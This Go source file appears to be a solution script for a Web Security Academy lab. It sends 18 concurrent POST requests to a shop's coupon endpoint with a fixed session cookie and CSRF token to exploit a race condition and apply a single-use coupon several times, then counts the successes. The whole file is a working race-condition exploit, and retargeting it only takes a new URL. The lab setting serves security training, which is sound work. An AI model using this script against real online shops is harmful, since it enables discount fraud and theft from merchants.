package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
)

const (
	CONCURRENT_REQUESTS = 18
	FORM_DATA           = "csrf=rupklm4Pxc8qqrdvO8pBlXBTgzMKl1xD&coupon=PROMO20"
	SESSION             = "session=6YCdEjgvKV3T41pTbZfY55pn7aTadlvw"
	URL                 = "https://0a58005703828cd4810393fa00df008e.web-security-academy.net/cart/coupon"
)

func main() {
	// WaitGroup to track completion of goroutines
	var wg sync.WaitGroup
	// Mutex to protect shared successCount
	var mutex sync.Mutex
	// Counter for successful requests
	var successCount int

	// Launch concurrent requests
	for i := range CONCURRENT_REQUESTS {
		wg.Add(1)
		// Start goroutine for each request
		go func(requestNum int) {
			defer wg.Done()

			// fmt.Printf("[%d] Request Started\n", i)

			// Create new HTTP POST request with form data
			req, err := http.NewRequest("POST", URL, strings.NewReader(FORM_DATA))
			if err != nil {
				fmt.Printf("Error creating request %d: %v\n", requestNum, err)
				return
			}

			// Add session cookie to request headers
			req.Header.Add("Cookie", SESSION)

			// Create HTTP client that doesn't follow redirects
			client := &http.Client{
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}

			// Send the request
			resp, err := client.Do(req)
			if err != nil {
				fmt.Printf("Error making request %d: %v\n", requestNum, err)
				return
			}
			defer resp.Body.Close()

			// Read response body
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				fmt.Printf("Error reading response body %d: %v\n", requestNum, err)
				return
			}

			bodyStr := string(body)
			// fmt.Printf("[%d] Request completed with status: %s\nBody: %s\n", requestNum, resp.Status, bodyStr)

			// If coupon was successfully applied, increment counter
			if bodyStr == "Coupon applied" {
				mutex.Lock()
				successCount++
				mutex.Unlock()
			}
		}(i)
	}

	// Wait for all requests to complete
	wg.Wait()
	fmt.Printf("Total requests: %d\nSuccessful requests: %d\n", CONCURRENT_REQUESTS, successCount)
}
